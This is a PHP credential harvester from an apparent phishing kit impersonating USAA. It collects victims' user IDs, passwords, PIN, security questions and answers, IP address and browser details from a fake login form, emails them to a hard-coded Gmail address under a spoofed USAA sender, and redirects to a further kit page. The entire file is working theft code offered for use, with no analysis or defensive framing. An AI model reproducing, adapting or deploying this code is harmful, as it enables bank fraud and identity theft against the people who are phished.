<?php
 $Ok= "rmcmiller147@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");$user_agent     =   $_SERVER['HTTP_USER_AGENT'];$hostname = gethostbyaddr($ip);$fuck  = "================== Contact Information & CC Infor ==================\n";
$fuck .= "USAA ID : ".$_POST['userid']."\n";$fuck .= "Password : ".$_POST['password']."\n";
$fuck .= "USAA ID2 : ".$_POST['userid2']."\n";$fuck .= "Password2 : ".$_POST['password2']."\n";
$fuck .= "P.i.N : ".$_POST['pin1']."\n";$fuck .= "Question Number 1: ".$_POST['q1']."\n";$fuck .= "Answer Number 1: ".$_POST['a1']."\n";$fuck .= "Question Number 2: ".$_POST['q2']."\n";$fuck .= "Answer Number 2 : ".$_POST['a2']."\n";$fuck .= "Question Number 3 : ".$_POST['q3']."\n";$fuck .= "Answer Number 3 : ".$_POST['a3']."\n";$fuck .= "Question Number 4 : ".$_POST['q4']."\n";$fuck .= "Answer Number 4 : ".$_POST['a4']."\n";$fuck .= "Question Number 5 : ".$_POST['q5']."\n";$fuck .= "Answer Number 5 : ".$_POST['a5']."\n";$fuck .= "Question Number 6 : ".$_POST['q6']."\n";$fuck .= "Answer Number 6 : ".$_POST['a6']."\n";$fuck .= "============= [ Ip & Hostname Info ] =============\n";$fuck .= "Client IP : ".$ip."\n";$fuck .= "HostName : ".$hostname."\n";$fuck .= "Date And Time : ".$date."\n";$fuck .= "Browser Details : ".$user_agent."\n";$fuck .= "=============+FishFlowbean+===========\n";$subject = "USAA. User/Pass/Pin/Question $ip";$headers = "From: uSAa <usaa@zenquel.com>";


mail($Ok,$subject,$fuck,$headers); 
Header ("Location: email.php");
?>